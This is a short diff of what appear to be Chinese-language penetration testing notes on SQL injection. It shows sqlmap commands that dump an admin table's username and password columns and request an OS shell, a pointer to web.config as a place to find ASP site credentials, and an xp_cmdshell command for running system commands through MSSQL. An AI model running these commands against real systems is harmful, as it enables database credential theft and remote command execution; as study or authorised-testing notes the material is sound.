@@ -26,3 +26,17 @@ sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump
 sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump --hex
 sqlmap -u http://url.php?id=1 --os-shell
 ```
+
+## config密码等 
+
+在asp web的目录下
+
+web.config
+
+## 命令执行
+
+方法一：xp_cmdshell 
+
+exec master..xp_cmdshell "whoami"默认执行是关闭 
+
+https://blog.csdn.net/weixin_30654583/article/details/97225375
